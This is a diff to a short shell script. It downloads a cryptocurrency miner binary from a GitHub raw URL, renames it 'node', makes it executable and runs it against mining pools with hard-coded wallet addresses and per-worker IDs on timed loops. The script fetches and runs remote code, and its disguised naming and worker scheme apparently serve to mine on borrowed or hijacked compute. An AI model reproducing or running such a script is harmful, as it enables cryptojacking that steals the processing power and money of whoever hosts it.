@@ -1,10 +1,10 @@
 #!/bin/sh
 # SRBMiner
-#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 # cNfj5q6A7c4yM3KD
 
 # xmr
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
 chmod +x node
 INPUT_NUMBER=$1
@@ -37,8 +37,10 @@ echo "start ${INPUT_NUMBER}"
 #./node --disable-gpu -a argon2d_16000 -o argon2d16000.na.mine.zpool.ca:4241 -u CLhiJjcviwzUbm73SCcuksW4UXSxZuGjFf.crf_${WORKER_NUMBER}  -p crf_${WORKER_NUMBER},c=ADOT,zap=ADOT > try.log
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
+# Raptorium + SRBMiner
+START=$(./node -a ghostrider -o asia.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.net_${INPUT_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1830 )
 # salvium
-START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=460000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
+#START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=460000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )
 
